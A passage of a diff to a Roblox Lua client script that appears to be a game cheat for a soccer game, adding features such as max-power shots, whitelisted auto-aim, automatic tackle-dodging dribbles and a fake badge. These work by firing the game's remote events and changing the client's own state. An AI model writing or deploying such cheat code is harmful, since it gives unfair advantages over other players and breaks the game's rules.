+						repeat wait() until Script_Disabled or a.Center.Button.BackgroundTransparency == 1
+						R:Disconnect()
+					end
+				end
+				---------------------------------------------------------------------------
+				F.Ball_Awareness_Function = function()
+					ToggleTransparency(a.Ball_Awareness)
+				end
+				if workspace:FindFirstChild("Ignore") then
+					workspace.Ignore.Predict.ChildAdded:Connect(function(p8)
+						if a.Ball_Awareness.Button.BackgroundTransparency == 0 and not Script_Disabled then
+							p8.Transparency = 0.6
 						end
 					end)
 				end
-			end
-			---------------------------------------------------------------------------
-			F.Jump_Input_Function = function()
-				ToggleTransparency(a.Jump_Input)
-			end
-			---------------------------------------------------------------------------
-			F.Show_Step_Radius_Function = function()
-				ToggleTransparency(a.Show_Step_Radius)
-				local Character = Player.Character
-				if a.Show_Step_Radius.Button.BackgroundTransparency == 0 then
-					local Cylinder, Weld = Instance.new('Part', Character), Instance.new('Weld', Character.HumanoidRootPart)
-					Cylinder.Name = "Radius"
-					Cylinder.Shape = Enum.PartType.Cylinder
-					Cylinder.Size = Vector3.new(0.1, StepTackleRadius, StepTackleRadius)
-					Cylinder.Anchored = false
-					Cylinder.CanCollide = false
-					Cylinder.Massless = true
-					Cylinder.Transparency = 0.7
-					Weld.Name = "Radius"
-					Weld.Part0 = Weld.Parent
-					Weld.Part1 = Cylinder
-					Weld.C0 = CFrame.new(0, -3, 0, -4.37113883e-08, -1, 0, 1, -4.37113883e-08, 0, 0, 0, 1)
-					while a.Show_Step_Radius.Button.BackgroundTransparency == 0 do
-						local Character = Player.Character
-						Cylinder.Parent = Character
-						Cylinder.Size = Vector3.new(0.1, StepTackleRadius, StepTackleRadius)
-						Weld.Parent = Character.HumanoidRootPart
-						Weld.Part0 = Weld.Parent
-
-						Player.CharacterAppearanceLoaded:Wait()
-					end
-				else
-					if Character:FindFirstChild("Radius") then Character.Radius:Destroy() end
-					if Character.HumanoidRootPart:FindFirstChild("Radius") then Character.HumanoidRootPart.Radius:Destroy() end
+				---------------------------------------------------------------------------
+				F.CarryBall_Function = function()
+					ToggleTransparency(a.CarryBall)
 				end
-			end
-			---------------------------------------------------------------------------
-			local Connection1 = nil
-			local Connection2 = nil
-			local BallConnect = nil
-			local Remote = Events.M1B
-			local BallCD = false
-			local function StopAnimations(character, Names, og)
-				local animationController = character:WaitForChild("Humanoid")
-				local tracks = animationController:GetPlayingAnimationTracks()
-				for _, track in pairs(tracks) do
-					if table.find(Names, track.Name) and track ~= og then
-						track:Stop()
+				---------------------------------------------------------------------------
+				local R = {}
+				local OriginalImage = nil
+				F.FormlessShooter_Function = function()
+					ToggleTransparency(a.FormlessShooter)
+					if a.FormlessShooter.Button.BackgroundTransparency == 0 then
+						OriginalImage = Player.PlayerGui.Layout.Badges.Slot1.Image
+						Player.PlayerGui.Layout.Badges.Slot1.Image = "rbxassetid://10323892082"
+						repeat wait() until Script_Disabled or a.FormlessShooter.Button.BackgroundTransparency == 1
+						Player.PlayerGui.Layout.Badges.Slot1.Image = OriginalImage
 					end
 				end
-			end
+				---------------------------------------------------------------------------
+				local playerEnteredRadius = {}
+				local playersInRadius = {}
 
-			F.Max_Power_Function = function()
-				ToggleTransparency(a.Max_Power)
-				if a.Max_Power.Button.BackgroundTransparency == 0 then
-					BallConnect = Player.Character.ChildAdded:Connect(function(Child)
-						if Child.Name == "Bola" and not BallCD then
-							BallCD = true
-							task.delay(2, function()
-								BallCD = false
-							end)
-						end
-					end)
-					Connection1 = Mouse.Button1Down:Connect(function()
-						local Character = Player.Character
-						local Hum = Character.Humanoid
-						if Player.Character:FindFirstChild("Bola") and not Script_Disabled then
-							if inAir(Player.Character) and a.FormlessShooter.Button.BackgroundTransparency == 0 and Remote.Name ~= "Invalid" then
-								CanDribble = false
-								local Anim = Hum.Animator:LoadAnimation(Animations.Kick)
-								Anim:Play()
-								Remote.Name = "Invalid"
-								Hum.AutoRotate = false
-								
-								local function Shoot(BodyRotate, Aim)
-									spawn(function()
-										wait(0.7)
-										BodyRotate:Disconnect()
-									end)
-									spawn(function()
-										wait(0.05)
-										if inAir(Player.Character) then
-											if Aim then
-												Remote:FireServer(ShotPower, AutoAim[1], AutoAim[2], false, nil, nil, nil)
-											else
-												Remote:FireServer(ShotPower, Mouse.Hit, Mouse.Target, false, nil, nil, nil)
-											end
-										end
-										wait(0.2)
-										Hum.AutoRotate = true
-									end)
+				local function onPlayerEnterRadius(otherPlayer)
+					table.insert(playersInRadius, otherPlayer)
+				end
+				local function onPlayerLeaveRadius(otherPlayer)
+					table.remove(playersInRadius, table.find(playersInRadius, otherPlayer))
+				end
+				local function checkRadius()
+					local playersInRadius = {}
+					for _, otherPlayer in pairs(game:GetService("Players"):GetPlayers()) do
+						if otherPlayer ~= Player and otherPlayer.Name ~= "Blu_Mo0n" then
+							local distance = (otherPlayer.Character.PrimaryPart.Position - Player.Character.PrimaryPart.Position).Magnitude
+							if distance <= SlideTackleRadius then
+								playersInRadius[otherPlayer] = true
+								if not playerEnteredRadius[otherPlayer] then
+									playerEnteredRadius[otherPlayer] = true
+									onPlayerEnterRadius(otherPlayer)
 								end
-								if a.Auto_Aim.Button.BackgroundTransparency ~= 0 then -- Formless, No Auto Aim
-									local BodyRotate = runService.RenderStepped:Connect(function()
-										ChangeBadge("ArcheType2", "NoLook")
-										local CharPos = Character.HumanoidRootPart.Position
-										local MousePos = Mouse.Hit.Position
-										Character.HumanoidRootPart.CFrame = CFrame.new(CharPos, Vector3.new(MousePos.X, CharPos.Y, MousePos.Z))
-									end)
-									Shoot(BodyRotate, false)
-								else -- Auto Aim
-									local BodyRotate = runService.RenderStepped:Connect(function()
-										ChangeBadge("ArcheType2", "NoLook")
-										local CharPos = Character.HumanoidRootPart.Position
-										Character.HumanoidRootPart.CFrame = CFrame.new(CharPos, Vector3.new(AutoAim[3].X, CharPos.Y, AutoAim[3].Z))
-									end)
-									Shoot(BodyRotate, true)
-								end
-							elseif not inAir(Player.Character) and Remote.Name ~= "Invalid" and not BallCD then
-								Remote.Name = "Invalid"
-								CanDribble = false
-								Hum.WalkSpeed = 0
-								Hum.AutoRotate = false
-								
-								local function Shoot(BodyRotate, Aim)
-									spawn(function()
-										wait(0.7)
-										Hum.WalkSpeed = 16
-										if Character.Humanoid:FindFirstChild("ShiftLock") then Character.Humanoid.ShiftLock:Destroy() end
-										BodyRotate:Disconnect()
-									end)
-									local Anim1 = Hum.Animator:LoadAnimation(Animations.ChargeKick)
-									Anim1:Play()
-									StopAnimations(Character, {"ChargeKick", "Kick"}, Anim1)
-									wait(0.5)
-									StopAnimations(Character, {"ChargeKick", "Kick"}, Anim1)
-									spawn(function()
-										wait(0.05)
-										if not inAir(Player.Character) then
-											local Anim2 = Hum.Animator:LoadAnimation(Animations.Kick)
-											Anim2:Play()
-											StopAnimations(Character, {"ChargeKick", "Kick"}, Anim2)
-											if Aim then
-												Remote:FireServer(ShotPower, AutoAim[1], AutoAim[2], false, nil, nil, nil)
-											else
-												Remote:FireServer(ShotPower, Mouse.Hit, Mouse.Target, false, nil, nil, nil)
-											end
-										end
-										wait(0.2)
-										Hum.AutoRotate = true
-									end)
-								end
-								if a.Auto_Aim.Button.BackgroundTransparency ~= 0 then
-									local BodyRotate = runService.RenderStepped:Connect(function()
-										ChangeBadge("ArcheType2", "NoLook")
-										local CharPos = Character.HumanoidRootPart.Position
-										local MousePos = Mouse.Hit.Position
-										Character.HumanoidRootPart.CFrame = CFrame.new(CharPos, Vector3.new(MousePos.X, CharPos.Y, MousePos.Z))
-									end)
-									Shoot(BodyRotate, false)
-								else -- Auto Aim
-									local BodyRotate = runService.RenderStepped:Connect(function()
-										ChangeBadge("ArcheType2", "NoLook")
-										local CharPos = Character.HumanoidRootPart.Position
-										Character.HumanoidRootPart.CFrame = CFrame.new(CharPos, Vector3.new(AutoAim[3].X, CharPos.Y, AutoAim[3].Z))
-									end)
-									Shoot(BodyRotate, true)
+							else
+								if playerEnteredRadius[otherPlayer] then
+									playerEnteredRadius[otherPlayer] = false
+									onPlayerLeaveRadius(otherPlayer)
 								end
 							end
-						elseif Script_Disabled then
+						end
+					end
+				end
+				local function FindTackleFootAnimation(Op, ID)
+					for i, Track in pairs (Op.Humanoid.Animator:GetPlayingAnimationTracks()) do
+						if Track.Animation.AnimationId == ID then
+							return true
+						end
+					end
+				end
+				F.Auto_Dribble_Function = function()
+					ToggleTransparency(a.Auto_Dribble)
+					if a.Auto_Dribble.Button.BackgroundTransparency == 0 then
+						local RenderStepped = runService.RenderStepped:Connect(checkRadius)
+
+						local Dribble_Loop 
+						Dribble_Loop = runService.RenderStepped:Connect(function()
+							local Character = Player.Character
+							if Character:FindFirstChild("Bola") and not inAir(Character) and not Character:FindFirstChild("IsDribbling") and Character.Humanoid.AutoRotate == true then
+								local Ball = Player.Character.Bola
+								for _, Op in ipairs(playersInRadius) do
+									local op = Op.Character
+									if op.Humanoid.Teammate.Value ~= Character.Humanoid.Teammate.Value and not Ball:FindFirstChild(op.Name) then
+										if op.Humanoid:FindFirstChild("Tackled") or FindTackleFootAnimation(op, "rbxassetid://9015340307") and (op.HumanoidRootPart.Position - Character.HumanoidRootPart.Position).Magnitude < StepTackleRadius then
+											if Character.Backpack.DribbleCounter.Value >= 1 and not UserInput:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) and not inAir(Character) and CanDribble and not Character:FindFirstChild("IsDribbling") and not Character.Humanoid:FindFirstChild("Tackled") and Character.Humanoid.AutoRotate == true then
+												Events.RealisticMovement:FireServer(game:GetService("Players").LocalPlayer, "V", true)
+
+												local CD = 1.5
+												if op.Humanoid:FindFirstChild("Tackled") then
+													CD = 3
+												end
+												local Tag = Instance.new("NumberValue")
+												Tag.Name = op.Name
+												Tag.Parent = Ball
+												Debris:AddItem(Tag, CD)
+											end
+										end
+									end
+								end
+							end
+							if a.Auto_Dribble.Button.BackgroundTransparency == 1 or Script_Disabled then
+								Dribble_Loop:Disconnect()
+								RenderStepped:Disconnect()
+								playerEnteredRadius = {}
+								playersInRadius = {}
+							end
+						end)
+					end
+				end
+				---------------------------------------------------------------------------
+				F.Jump_Input_Function = function()
+					ToggleTransparency(a.Jump_Input)
+				end
+				---------------------------------------------------------------------------
+				F.Show_Step_Radius_Function = function()
+					ToggleTransparency(a.Show_Step_Radius)
+					local Character = Player.Character
+					if a.Show_Step_Radius.Button.BackgroundTransparency == 0 then
+						local Cylinder, Weld = Instance.new('Part', Character), Instance.new('Weld', Character.HumanoidRootPart)
+						Cylinder.Name = "Radius"
+						Cylinder.Shape = Enum.PartType.Cylinder
+						Cylinder.Size = Vector3.new(0.1, StepTackleRadius, StepTackleRadius)
+						Cylinder.Anchored = false
+						Cylinder.CanCollide = false
+						Cylinder.Massless = true
+						Cylinder.Transparency = 0.7
+						Weld.Name = "Radius"
+						Weld.Part0 = Weld.Parent
+						Weld.Part1 = Cylinder
+						Weld.C0 = CFrame.new(0, -3, 0, -4.37113883e-08, -1, 0, 1, -4.37113883e-08, 0, 0, 0, 1)
+						while a.Show_Step_Radius.Button.BackgroundTransparency == 0 do
+							local Character = Player.Character
+							Cylinder.Parent = Character
+							Cylinder.Size = Vector3.new(0.1, StepTackleRadius, StepTackleRadius)
+							Weld.Parent = Character.HumanoidRootPart
+							Weld.Part0 = Weld.Parent
+
+							Player.CharacterAppearanceLoaded:Wait()
+						end
+					else
+						if Character:FindFirstChild("Radius") then Character.Radius:Destroy() end
+						if Character.HumanoidRootPart:FindFirstChild("Radius") then Character.HumanoidRootPart.Radius:Destroy() end
+					end
+				end
+				---------------------------------------------------------------------------
+				local Connection1 = nil
+				local Connection2 = nil
+				local BallConnect = nil
+				local Remote = Events.M1B
+				local BallCD = false
+				local function StopAnimations(character, Names, og)
+					local animationController = character:WaitForChild("Humanoid")
+					local tracks = animationController:GetPlayingAnimationTracks()
+					for _, track in pairs(tracks) do
+						if table.find(Names, track.Name) and track ~= og then
+							track:Stop()
+						end
+					end
+				end
+
+				F.Max_Power_Function = function()
+					ToggleTransparency(a.Max_Power)
+					if a.Max_Power.Button.BackgroundTransparency == 0 then
+						BallConnect = Player.Character.ChildAdded:Connect(function(Child)
+							if Child.Name == "Bola" and not BallCD then
+								BallCD = true
+								task.delay(2, function()
+									BallCD = false
+								end)
+							end
+						end)
+						Connection1 = Mouse.Button1Down:Connect(function()
+							local Character = Player.Character
+							local Hum = Character.Humanoid
+							if Player.Character:FindFirstChild("Bola") and not Script_Disabled then
+								if inAir(Player.Character) and a.FormlessShooter.Button.BackgroundTransparency == 0 and Remote.Name ~= "Invalid" then
+									CanDribble = false
+									local Anim = Hum.Animator:LoadAnimation(Animations.Kick)
+									Anim:Play()
+									Remote.Name = "Invalid"
+									Hum.AutoRotate = false
+
+									local function Shoot(BodyRotate, Aim)
+										spawn(function()
+											wait(0.7)
+											BodyRotate:Disconnect()
+										end)
+										spawn(function()
+											wait(0.05)
+											if inAir(Player.Character) then
+												if Aim then
+													Remote:FireServer(ShotPower, AutoAim[1], AutoAim[2], false, nil, nil, nil)
+												else
+													Remote:FireServer(ShotPower, Mouse.Hit, Mouse.Target, false, nil, nil, nil)
+												end
+											end
+											wait(0.2)
+											Hum.AutoRotate = true
+										end)
+									end
+									if a.Auto_Aim.Button.BackgroundTransparency ~= 0 then -- Formless, No Auto Aim
+										local BodyRotate = runService.RenderStepped:Connect(function()
+											ChangeBadge("ArcheType2", "NoLook")
+											local CharPos = Character.HumanoidRootPart.Position
+											local MousePos = Mouse.Hit.Position
+											Character.HumanoidRootPart.CFrame = CFrame.new(CharPos, Vector3.new(MousePos.X, CharPos.Y, MousePos.Z))
+										end)
+										Shoot(BodyRotate, false)
+									else -- Auto Aim
+										local BodyRotate = runService.RenderStepped:Connect(function()
+											ChangeBadge("ArcheType2", "NoLook")
+											local CharPos = Character.HumanoidRootPart.Position
+											Character.HumanoidRootPart.CFrame = CFrame.new(CharPos, Vector3.new(AutoAim[3].X, CharPos.Y, AutoAim[3].Z))
+										end)
+										Shoot(BodyRotate, true)
+									end
+								elseif not inAir(Player.Character) and Remote.Name ~= "Invalid" and not BallCD then
+									Remote.Name = "Invalid"
+									CanDribble = false
+									Hum.WalkSpeed = 0
+									Hum.AutoRotate = false
+
+									local function Shoot(BodyRotate, Aim)
+										spawn(function()
+											wait(0.7)
+											Hum.WalkSpeed = 16
+											if Character.Humanoid:FindFirstChild("ShiftLock") then Character.Humanoid.ShiftLock:Destroy() end
+											BodyRotate:Disconnect()
+										end)
+										local Anim1 = Hum.Animator:LoadAnimation(Animations.ChargeKick)
+										Anim1:Play()
+										StopAnimations(Character, {"ChargeKick", "Kick"}, Anim1)
+										wait(0.5)
+										StopAnimations(Character, {"ChargeKick", "Kick"}, Anim1)
+										spawn(function()
+											wait(0.05)
+											if not inAir(Player.Character) then
+												local Anim2 = Hum.Animator:LoadAnimation(Animations.Kick)
+												Anim2:Play()
+												StopAnimations(Character, {"ChargeKick", "Kick"}, Anim2)
+												if Aim then
+													Remote:FireServer(ShotPower, AutoAim[1], AutoAim[2], false, nil, nil, nil)
+												else
+													Remote:FireServer(ShotPower, Mouse.Hit, Mouse.Target, false, nil, nil, nil)
+												end
+											end
+											wait(0.2)
+											Hum.AutoRotate = true
+										end)
+									end
+									if a.Auto_Aim.Button.BackgroundTransparency ~= 0 then
+										local BodyRotate = runService.RenderStepped:Connect(function()
+											ChangeBadge("ArcheType2", "NoLook")
+											local CharPos = Character.HumanoidRootPart.Position
+											local MousePos = Mouse.Hit.Position
+											Character.HumanoidRootPart.CFrame = CFrame.new(CharPos, Vector3.new(MousePos.X, CharPos.Y, MousePos.Z))
+										end)
+										Shoot(BodyRotate, false)
+									else -- Auto Aim
+										local BodyRotate = runService.RenderStepped:Connect(function()
+											ChangeBadge("ArcheType2", "NoLook")
+											local CharPos = Character.HumanoidRootPart.Position
+											Character.HumanoidRootPart.CFrame = CFrame.new(CharPos, Vector3.new(AutoAim[3].X, CharPos.Y, AutoAim[3].Z))
+										end)
+										Shoot(BodyRotate, true)
+									end
+								end
+							elseif Script_Disabled then
+								Remote.Name = "M1B"
+								Connection1:Disconnect()
+								Connection2:Disconnect()
+								BallConnect:Disconnect()
+								Connection1 = nil
+								Connection2 = nil
+							end
+						end)
+						Connection2 = Mouse.Button1Up:Connect(function()
+							wait(1.5)
 							Remote.Name = "M1B"
+							CanDribble = true
+						end)
+					else
+						if Connection1 ~= nil then
 							Connection1:Disconnect()
 							Connection2:Disconnect()
 							BallConnect:Disconnect()
 							Connection1 = nil
 							Connection2 = nil
 						end
-					end)
-					Connection2 = Mouse.Button1Up:Connect(function()
-						wait(1.5)
-						Remote.Name = "M1B"
-						CanDribble = true
-					end)
-				else
-					if Connection1 ~= nil then
-						Connection1:Disconnect()
-						Connection2:Disconnect()
-						BallConnect:Disconnect()
-						Connection1 = nil
-						Connection2 = nil
 					end
 				end
-			end
-			---------------------------------------------------------------------------
-			local Connection
-			local Part
-			F.Auto_Aim_Function = function()
-				ToggleTransparency(a.Auto_Aim)
-				if a.Auto_Aim.Button.BackgroundTransparency == 0 and not Script_Disabled and table.find(AutoAimWhitelist, Player.UserId) then
-					Connection = UserInput.InputBegan:Connect(function(Key, isT)
-						if not isT and Key.KeyCode == Enum.KeyCode.LeftAlt and a.Auto_Aim.Button.BackgroundTransparency == 0 then
-							AutoAim[1] = Mouse.Hit
-							AutoAim[2] = Mouse.Target
-							AutoAim[3] = Mouse.Hit.Position
-							if Part then
-								Part.Position = AutoAim[3]
-							else
-								Part = Instance.new("Part", workspace)
-								Part.Anchored = true
-								Part.Size = Vector3.new(2,2,2)
-								Part.Material = Enum.Material.Neon
-								Part.Position = AutoAim[3]
-								Part.Shape = Enum.PartType.Ball
-							end
-						end
-					end)
-				else
-					Part:Destroy()
-					Part = nil
-					Connection:Disconnect()
-				end
-			end
-			---------------------------------------------------------------------------
-			function replaceSpacesWithUnderscores(input)
-				local result = ""
-
-				for i = 1, #input do
-					local char = input:sub(i, i)
-
-					if char == " " then
-						result = result .. "_"
-					else
-						result = result .. char
-					end
-				end
-
-				return result
-			end
-			---------------------------------------------------------------------------
-			function BindButtons(frame, funcName)
-				local bindKey
-				local d = true
-				frame.Button.MouseButton1Click:Connect(function()
-					if frame.Button.Text ~= "Press a Key" and d then
-						d = false
-						frame.Button.Text = "Press a Key"
-						bindKey = nil
-
-						local inputBeganConn = UserInput.InputBegan:Connect(function(key, isTyping)
-							if not Script_Disabled and frame.Button.Text == "Press a Key" then
-								local keyCode = tostring(key.KeyCode)
-								local userInputType = tostring(key.UserInputType)
-								if string.split(keyCode, ".")[3] == "Escape" or string.split(keyCode, ".")[3] == "Backspace" then
-									bindKey = "Enum.KeyCode."
-								elseif string.split(keyCode, ".")[3] ~= "Unknown" then
-									bindKey = keyCode
-								elseif string.split(userInputType, ".")[3] ~= "Unknown" then
-									bindKey = userInputType
+				---------------------------------------------------------------------------
+				local Connection
+				local Part
+				F.Auto_Aim_Function = function()
+					ToggleTransparency(a.Auto_Aim)
+					if a.Auto_Aim.Button.BackgroundTransparency == 0 and not Script_Disabled and table.find(AutoAimWhitelist, Player.UserId) then
+						Connection = UserInput.InputBegan:Connect(function(Key, isT)
+							if not isT and Key.KeyCode == Enum.KeyCode.LeftAlt and a.Auto_Aim.Button.BackgroundTransparency == 0 then
+								AutoAim[1] = Mouse.Hit
+								AutoAim[2] = Mouse.Target
+								AutoAim[3] = Mouse.Hit.Position
+								if Part then
+									Part.Position = AutoAim[3]
+								else
+									Part = Instance.new("Part", workspace)
+									Part.Anchored = true
+									Part.Size = Vector3.new(2,2,2)
+									Part.Material = Enum.Material.Neon
+									Part.Position = AutoAim[3]
+									Part.Shape = Enum.PartType.Ball
 								end
-								frame.Button.Text = string.split(bindKey, ".")[3]
 							end
 						end)
-
-						repeat wait() until bindKey
-						inputBeganConn:Disconnect()
-						wait(0.05)
-						d = true
+					else
+						Part:Destroy()
+						Part = nil
+						Connection:Disconnect()
 					end
-				end)
+				end
+			end
+		end
+		function replaceSpacesWithUnderscores(input)
+			local result = ""
 
-				UserInput.InputBegan:Connect(function(key, isTyping)
-					if not Script_Disabled and not isTyping and frame.Button.Text ~= "Press a Key" and d then
-						local keyCode = tostring(key.KeyCode)
-						local userInputType = tostring(key.UserInputType)
-						if (keyCode == bindKey) or (userInputType == bindKey) then
-							if funcName == "No_Stam_Sprint" and bindKey == "Enum.UserInputType.MouseButton2" then
-								if UserInput.MouseBehavior == Enum.MouseBehavior.LockCenter then
-									F[funcName .. "_Function"](true)
-								end
-							else
-								F[funcName .. "_Function"]()
+			for i = 1, #input do
+				local char = input:sub(i, i)
+
+				if char == " " then
+					result = result .. "_"
+				else
+					result = result .. char
+				end
+			end
+
+			return result
+		end
+		---------------------------------------------------------------------------
+		function BindButtons(frame, funcName)
+			local bindKey
+			local d = true
+			frame.Button.MouseButton1Click:Connect(function()
+				if frame.Button.Text ~= "Press a Key" and d then
+					d = false
+					frame.Button.Text = "Press a Key"
+					bindKey = nil
+
+					local inputBeganConn = UserInput.InputBegan:Connect(function(key, isTyping)
+						if not Script_Disabled and frame.Button.Text == "Press a Key" then
+							local keyCode = tostring(key.KeyCode)
+							local userInputType = tostring(key.UserInputType)
+							if string.split(keyCode, ".")[3] == "Escape" or string.split(keyCode, ".")[3] == "Backspace" then
+								bindKey = "Enum.KeyCode."
+							elseif string.split(keyCode, ".")[3] ~= "Unknown" then
+								bindKey = keyCode
+							elseif string.split(userInputType, ".")[3] ~= "Unknown" then
+								bindKey = userInputType
 							end
+							frame.Button.Text = string.split(bindKey, ".")[3]
+						end
+					end)
+
+					repeat wait() until bindKey
+					inputBeganConn:Disconnect()
+					wait(0.05)
+					d = true
+				end
+			end)
+
+			UserInput.InputBegan:Connect(function(key, isTyping)
+				if not Script_Disabled and not isTyping and frame.Button.Text ~= "Press a Key" and d then
+					local keyCode = tostring(key.KeyCode)
+					local userInputType = tostring(key.UserInputType)
+					if (keyCode == bindKey) or (userInputType == bindKey) then
+						if funcName == "No_Stam_Sprint" and bindKey == "Enum.UserInputType.MouseButton2" then
+							if UserInput.MouseBehavior == Enum.MouseBehavior.LockCenter then
+								F[funcName .. "_Function"](true)
+							end
+						else
+							F[funcName .. "_Function"]()
 						end
 					end
-				end)
-			end
-			for _, i in pairs(b) do
-				BindButtons(i, replaceSpacesWithUnderscores(i.Name))
-			end
-			---------------------------------------------------------------------------
-			for _, i in pairs(a) do
-				i.Button.MouseButton1Click:Connect(F[replaceSpacesWithUnderscores(i.Name).."_Function"])
-			end
+				end
+			end)
+		end
+		
+		for _, i in pairs(b) do
+			BindButtons(i, replaceSpacesWithUnderscores(i.Name))
+		end
+		---------------------------------------------------------------------------
+		for _, i in pairs(a) do
+			i.Button.MouseButton1Click:Connect(F[replaceSpacesWithUnderscores(i.Name).."_Function"])
 		end
 	end
 	game:GetService("Players").PlayerRemoving:Connect(function(Plr)
